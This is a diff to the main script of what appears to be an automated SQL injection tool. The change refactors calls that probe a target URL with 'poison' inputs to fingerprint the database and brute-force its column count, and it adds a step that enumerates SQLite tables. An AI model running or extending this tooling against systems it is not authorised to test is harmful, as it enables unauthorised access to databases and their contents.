@@ -2,6 +2,7 @@ from sys import argv, exit
 from requests import ConnectionError
 from time import sleep
 from enum import Enum
+from enumerators import Sqlite_Enumerator
 
 
 # Local Modules
@@ -32,11 +33,13 @@ if __name__ == "__main__":
     tries = 0
     while (True):
         try:
-            version = determine_dbms(
-                opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.ALNUM.value, int(opts.COLUMNS or "0"), brute_force)
+            opts.QUERY_TYPE = Poison.ALNUM.name
+            version = determine_dbms(opts, Poison.ALNUM.value, int(
+                opts.COLUMNS or "0"), brute_force)
             if version is None:
-                version = determine_dbms(
-                    opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.NUMERIC.value, int(opts.COLUMNS or "0"), brute_force)
+                opts.QUERY_TYPE = Poison.NUMERIC.name
+                version = determine_dbms(opts, Poison.NUMERIC.value, int(
+                    opts.COLUMNS or "0"), brute_force)
 
             break
         except ConnectionError:
@@ -49,9 +52,20 @@ if __name__ == "__main__":
 
     if version is not None:
         print("\n[*] Got version " + version.name)
+
+        if brute_force:
+            print("[*] Determined column size: ", opts.COLUMNS)
+
     elif brute_force:
         printer.brute_force_error()
         exit(1)
     else:
         printer.column_error()
         exit(1)
+
+    sqlite_enum = Sqlite_Enumerator()
+    res = sqlite_enum.enumerate_table(opts, Poison[opts.QUERY_TYPE].value)
+    if res is not None and len(res) > 0:
+        print("[*] Got tables: \n    - " + "\n    - ".join(res))
+    else:
+        print("[x] Could not get table info")
